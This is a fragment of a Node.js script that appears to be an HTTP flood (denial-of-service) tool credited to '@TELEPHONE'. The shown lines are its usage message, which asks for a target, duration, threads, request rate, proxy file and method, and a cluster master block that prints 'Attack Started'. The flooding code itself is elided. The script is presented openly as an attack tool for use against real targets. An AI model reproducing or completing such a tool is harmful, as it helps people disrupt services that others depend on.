...
if (process.argv.length < 7) {
    console.log(`Usage: ${process.argv[1]} <TARGET> <TIME> <THREADS> <REQUEST> <PROXYFILE.TXT> <GET/PRI>| MADE BY @TELEPHONE`)
    process.exit(1)
}
...
if (cluster.isMaster) {
	console.log('Attack Started | FLOOD MADE BY @TELEPHONE');
